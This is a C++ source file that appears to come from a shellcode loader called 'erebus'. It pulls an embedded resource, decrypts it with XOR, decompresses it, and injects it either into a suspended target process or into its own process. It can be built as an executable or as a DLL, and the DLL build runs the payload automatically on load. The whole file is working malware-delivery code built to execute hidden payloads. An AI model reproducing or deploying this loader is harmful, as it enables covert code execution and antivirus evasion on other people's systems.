#include "../include/key.hpp"
#include "../include/loader.hpp"
#include "../include/config.hpp"

VOID entry(void)
{
	erebus::config.injection_method = ExecuteShellcode;

	HANDLE process_handle, thread_handle = INVALID_HANDLE_VALUE;
	BYTE* shellcode = NULL;
	SIZE_T shellcode_size = 0;

	erebus::StageResource(IDR_EREBUS_BIN1, L"EREBUS_BIN", &shellcode, &shellcode_size);

#if CONFIG_INJECTION_MODE == 1
	// Remote injection: create suspended process
	wchar_t cmdline[] = CONFIG_TARGET_PROCESS;
	erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle);
#elif CONFIG_INJECTION_MODE == 2
	// Self injection: use current process
	process_handle = NtCurrentProcess();
	thread_handle = NtCurrentThread();
#endif

	// ============================================================
	// DEOBFUSCATION ROUTINE: Decode -> Decrypt -> Decompress
	// ============================================================

	// STEP 1: DECODE (String-based encoding detection and decoding)
	LOG_INFO("STEP 1: Analyzing encoding format...");
	// Note: If shellcode is stored as encoded string, decode it first
	// This would be handled if the shellcode resource is base64/ascii85/etc encoded

	// STEP 2: DECRYPT (XOR or other decryption)
	LOG_INFO("STEP 2: Decrypting shellcode...");
	LOG_SUCCESS("Applying XOR decryption...");
	erebus::DecryptionXOR(shellcode, shellcode_size, key, sizeof(key));
	LOG_SUCCESS("Decryption complete");

	// STEP 3: DECOMPRESS (Binary compression detection and decompression)
	LOG_INFO("STEP 3: Analyzing compression format...");
	erebus::AutoDetectAndDecode(&shellcode, &shellcode_size);
	LOG_SUCCESS("Final shellcode size: %zu bytes", shellcode_size);

	erebus::config.injection_method(shellcode, shellcode_size, process_handle, thread_handle);

	return;
}

#if _DEBUG

int main()
{
	entry();
	return 0;
}

#elif _WINDLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		entry();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

#else
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	entry();
	return 0;
}
#endif
